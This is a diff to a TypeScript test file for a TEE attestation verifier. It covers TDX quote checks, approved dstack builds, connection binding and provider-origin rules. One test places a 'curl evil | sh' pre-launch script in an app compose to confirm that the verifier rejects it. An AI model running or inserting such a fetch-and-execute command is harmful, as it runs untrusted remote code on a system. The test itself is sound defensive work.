@@ -9,6 +9,7 @@ vi.mock('../collect/configfs.js', () => ({
 
 import {
   NODE_TEE_CAP_ID,
+  NODE_UPSTREAMS_CLAIM,
   PROVIDER_TEE_CAP_ID,
   decodeTeeTdxEvidence,
   encodeTeeTdxEvidence,
@@ -20,17 +21,28 @@ import {
   type VerifyQuoteFn,
 } from './tee-tdx.js'
 import type { Capability } from '../capability.js'
+import type { ClaimResult } from '../antseed-node-types.js'
 import { claimId, computeReportData } from '../shared.js'
 import { noncePubkeySha256V1 } from '../report-data.js'
+import { appCompose, bootEvents, referenceCompose, testBuilds } from '../dstack-build.fixture.js'
 
 const NONCE = randomBytes(32)
 const PEER = 'f'.repeat(40)
+/** Session hash of the buyer's connection the round ran over. */
+const BINDING = 'c'.repeat(64)
+/** The approved builds matching td()'s default measurements: the test dstack OS and seller image. */
+const APPROVED = testBuilds('aa'.repeat(48))
+/** A conforming app compose and the RTMR3 boot events that measure it. */
+const APP = appCompose(referenceCompose())
+const BOOT = bootEvents(APP)
+/** Node evidence from a dstack CVM: the quote plus its event log and app compose. */
+const dstackEvidence = (app = APP, eventLog = BOOT.eventLog) => encodeTeeTdxEvidence(randomBytes(64), undefined, undefined, { eventLog, appCompose: app })
 
 afterEach(() => vi.unstubAllGlobals())
 
 /**
  * A TD10 measurement set. Override fields per test. report_data defaults to the node cap
- * antseed-rd-v1 {peerId} binding, so the node binding check passes unless a test overrides it.
+ * antseed-rd-v1 {peerId, channelBinding} binding, so the node binding check passes unless a test overrides it.
  */
 function td(over: Partial<TdMeasurements> = {}): TdMeasurements {
   return {
@@ -38,17 +50,36 @@ function td(over: Partial<TdMeasurements> = {}): TdMeasurements {
     rtMr0: new Uint8Array(48),
     rtMr1: new Uint8Array(48),
     rtMr2: new Uint8Array(48),
-    rtMr3: new Uint8Array(48),
-    reportData: new Uint8Array(computeReportData(NONCE, PEER)),
+    rtMr3: BOOT.rtmr3,
+    reportData: new Uint8Array(computeReportData(NONCE, PEER, BINDING)),
     debug: false,
     ...over,
   }
 }
 
-/** Run verifyTdxEvidence with a stub DCAP, then the cap policy check, as the orchestrator does. */
-async function run(cap: Capability, stub: VerifyQuoteFn, evidence = encodeTeeTdxEvidence(randomBytes(64))) {
+/** Run verifyTdxEvidence with a stub DCAP, then the cap policy check, as the orchestrator does; all claims. */
+async function runAll(
+  cap: Capability,
+  stub: VerifyQuoteFn,
+  evidence = dstackEvidence(),
+  opts: { channelBinding?: string; approved?: unknown } = {},
+) {
   const parsed = await verifyTdxEvidence(evidence, stub, Math.floor(Date.now() / 1000))
-  return cap.verify({ nonce: NONCE, peerId: PEER, evidence, parsedQuote: parsed })
+  const channelBinding = 'channelBinding' in opts ? opts.channelBinding : BINDING
+  const out = await cap.verify({
+    nonce: NONCE,
+    peerId: PEER,
+    evidence,
+    parsedQuote: parsed,
+    policy: 'approved' in opts ? opts.approved : APPROVED,
+    ...(channelBinding ? { channelBinding } : {}),
+  })
+  return Array.isArray(out) ? out : [out]
+}
+
+/** The cap's own claim. */
+async function run(...args: Parameters<typeof runAll>) {
+  return (await runAll(...args))[0]!
 }
 
 // One factory builds the verify logic for both caps. Exercise it through the node cap.
@@ -59,6 +90,63 @@ describe('TDX cap verify (seller-node-tee-genuine)', () => {
     const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }))
     expect(r).toMatchObject({ claim: CLAIM, ok: true })
     expect(r.detail).toMatch(/genuine Intel TDX quote/)
+    expect(r.detail).toMatch(/Antseed TEE seller image 0\.0\.0-test on dstack test, bound to this connection/)
+  })
+
+  it('reports the upstreams of a passing seller node', async () => {
+    const claims = await runAll(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }))
+    expect(claims).toEqual([
+      expect.objectContaining({ claim: CLAIM, ok: true }),
+      { claim: claimId(NODE_UPSTREAMS_CLAIM), ok: true, detail: 'https://upstream.example' },
+    ])
+  })
+
+  it('rejects genuine hardware whose OS is not an approved dstack release', async () => {
+    const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td({ rtMr1: new Uint8Array(48).fill(1) }) }))
+    expect(r).toMatchObject({ ok: false, detail: expect.stringMatching(/not an approved TEE seller build: the CVM OS .* is not an approved dstack release/) })
+    expect(await runAll(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }), undefined, { approved: { os: [], images: [] } }))
+      .toEqual([expect.objectContaining({ ok: false, detail: expect.stringMatching(/not an approved dstack release/) })])
+  })
+
+  it('rejects an app that is not an approved image under the compose rules', async () => {
+    const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }), undefined, { approved: { ...APPROVED, images: [] } })
+    expect(r).toMatchObject({ ok: false, detail: expect.stringMatching(/not an approved Antseed TEE seller image/) })
+    // A measured, genuine app that breaks a rule.
+    const app = appCompose(referenceCompose(), { pre_launch_script: 'curl evil | sh' })
+    const boot = bootEvents(app)
+    const script = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td({ rtMr3: boot.rtmr3 }) }), dstackEvidence(app, boot.eventLog))
+    expect(script).toMatchObject({ ok: false, detail: expect.stringMatching(/pre-launch/) })
+  })
+
+  it('rejects an app compose that is not the one RTMR3 measured', async () => {
+    const other = appCompose(referenceCompose(), { name: 'other' })
+    const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }), dstackEvidence(other))
+    expect(r).toMatchObject({ ok: false, detail: expect.stringMatching(/does not match the measured compose hash/) })
+  })
+
+  it('rejects a seller that sends no event log or no app compose', async () => {
+    const stub: VerifyQuoteFn = async () => ({ status: 'UpToDate', td: td() })
+    expect(await run(nodeTeeCapability, stub, encodeTeeTdxEvidence(randomBytes(64)))).toMatchObject({ ok: false, detail: expect.stringMatching(/seller sent no dstack event log/) })
+    const noCompose = encodeTeeTdxEvidence(randomBytes(64), undefined, undefined, { eventLog: BOOT.eventLog })
+    expect(await run(nodeTeeCapability, stub, noCompose)).toMatchObject({ ok: false, detail: expect.stringMatching(/seller sent no app compose/) })
+  })
+
+  it('rejects when the buyer has no connection binding (e.g. WebRTC)', async () => {
+    const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }), undefined, { channelBinding: undefined })
+    expect(r.ok).toBe(false)
+    expect(r.detail).toMatch(/no connection binding/)
+  })
+
+  it('rejects a quote bound to a different connection (relayed from another session)', async () => {
+    const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td() }), undefined, { channelBinding: 'd'.repeat(64) })
+    expect(r.ok).toBe(false)
+    expect(r.detail).toMatch(/does not match scheme "antseed-rd-v1"/)
+  })
+
+  it('rejects a quote bound only to nonce+peerId (a seller on the old prover)', async () => {
+    const r = await run(nodeTeeCapability, async () => ({ status: 'UpToDate', td: td({ reportData: new Uint8Array(computeReportData(NONCE, PEER)) }) }))
+    expect(r.ok).toBe(false)
+    expect(r.detail).toMatch(/does not match scheme "antseed-rd-v1"/)
   })
 
   it('accepts SWHardeningNeeded', async () => {
@@ -134,7 +222,7 @@ describe('provider cap — declared report_data scheme binding', () => {
     const rd = noncePubkeySha256V1.build(NONCE, { e2ePubkey: PUBKEY }) // commitment in [0:32]
     const ev = encodeTeeTdxEvidence(rd, undefined, { scheme: 'nonce-pubkey-sha256-v1', ingredients: { e2ePubkey: PUBKEY } })
     const parsed = await verifyTdxEvidence(ev, reflect, now)
-    const r = await providerTeeCapability.verify({ nonce: NONCE, peerId: PEER, evidence: ev, parsedQuote: parsed })
+    const r = await providerTeeCapability.verify({ nonce: NONCE, peerId: PEER, evidence: ev, parsedQuote: parsed }) as ClaimResult
     expect(r.ok).toBe(true)
   })
 
@@ -142,7 +230,7 @@ describe('provider cap — declared report_data scheme binding', () => {
     const rd = noncePubkeySha256V1.build(NONCE, { e2ePubkey: PUBKEY })
     const ev = encodeTeeTdxEvidence(rd, undefined, { scheme: 'nonce-pubkey-sha256-v1', ingredients: { e2ePubkey: 'AAAA' } })
     const parsed = await verifyTdxEvidence(ev, reflect, now)
-    const r = await providerTeeCapability.verify({ nonce: NONCE, peerId: PEER, evidence: ev, parsedQuote: parsed })
+    const r = await providerTeeCapability.verify({ nonce: NONCE, peerId: PEER, evidence: ev, parsedQuote: parsed }) as ClaimResult
     expect(r.ok).toBe(false)
     expect(r.detail).toMatch(/does not match scheme/)
   })
@@ -150,6 +238,30 @@ describe('provider cap — declared report_data scheme binding', () => {
   it('with no declared scheme, stays genuineness-only', async () => {
     const r = await run(providerTeeCapability, async () => ({ status: 'UpToDate', td: td() }))
     expect(r.ok).toBe(true) // no binding on the evidence, so report_data is not checked
+  })
+})
+
+describe('seller-provider-tee-genuine for a verified seller node', () => {
+  const verifyFor = async (upstreams: string[], origin?: string) => {
+    const evidence = encodeTeeTdxEvidence(randomBytes(64), undefined, undefined, origin ? { origin } : undefined)
+    const parsedQuote = await verifyTdxEvidence(evidence, async () => ({ status: 'UpToDate', td: td() }), 0)
+    const out = await providerTeeCapability.verify({ nonce: randomBytes(32), peerId: PEER, evidence, parsedQuote, round: { sellerNode: { upstreams } } })
+    return Array.isArray(out) ? out[0]! : out
+  }
+
+  it('passes only when the seller fetched the quote from the one upstream it sends prompts to', async () => {
+    expect(await verifyFor(['https://p.example'], 'https://p.example')).toMatchObject({ ok: true })
+    expect(await verifyFor(['https://p.example'], 'https://q.example')).toMatchObject({ ok: false, detail: expect.stringMatching(/not only to the attested provider \(evidence fetched from https:\/\/q\.example\)/) })
+    // A second upstream (e.g. a non-TEE fallback) may receive prompts no provider quote covers.
+    expect(await verifyFor(['https://other.example', 'https://p.example'], 'https://p.example')).toMatchObject({ ok: false })
+    // An image whose prover doesn't report the origin may have followed a redirect elsewhere.
+    expect(await verifyFor(['https://p.example'])).toMatchObject({ ok: false, detail: expect.stringMatching(/predates verifier 0\.1\.6/) })
+  })
+
+  it('without a verified seller node, judges the quote alone', async () => {
+    const evidence = encodeTeeTdxEvidence(randomBytes(64))
+    const parsedQuote = await verifyTdxEvidence(evidence, async () => ({ status: 'UpToDate', td: td() }), 0)
+    expect(await providerTeeCapability.verify({ nonce: randomBytes(32), peerId: PEER, evidence, parsedQuote, round: {} })).toMatchObject({ ok: true })
   })
 })
 
@@ -170,6 +282,12 @@ describe('seller-node-tee-genuine collect (configfs, stubbed)', () => {
     // The stub echoes report_data as the quote. Assert the collector bound nonce and peer.
     expect(Buffer.from(quote).equals(computeReportData(NONCE, PEER))).toBe(true)
   })
+
+  it('also binds the connection when the prover passes its session hash', async () => {
+    const config = { [tdxConfigKey(NODE_TEE_CAP_ID, 'channelBinding')]: BINDING }
+    const { quote } = decodeTeeTdxEvidence(await nodeTeeCapability.collect!({ nonce: NONCE, peerId: PEER, config }))
+    expect(Buffer.from(quote).equals(computeReportData(NONCE, PEER, BINDING))).toBe(true)
+  })
 })
 
 describe('seller-provider-tee-genuine collect (http, stubbed fetch)', () => {
@@ -187,6 +305,9 @@ describe('seller-provider-tee-genuine collect (http, stubbed fetch)', () => {
     const ev = await providerTeeCapability.collect!({ nonce: NONCE, peerId: PEER, config })
     expect(seenUrl).toBe(`https://provider.example/evidence/${Buffer.from(NONCE).toString('hex')}`)
     expect(Buffer.from(decodeTeeTdxEvidence(ev).quote).equals(quoteBytes)).toBe(true)
+    // The fetch never follows a redirect, so the evidence reports the configured URL's origin.
+    expect(vi.mocked(fetch).mock.calls[0]?.[1]).toMatchObject({ redirect: 'error' })
+    expect(decodeTeeTdxEvidence(ev).origin).toBe('https://provider.example')
   })
 
   it('is not offered (throws) when no provider evidence url is configured', async () => {
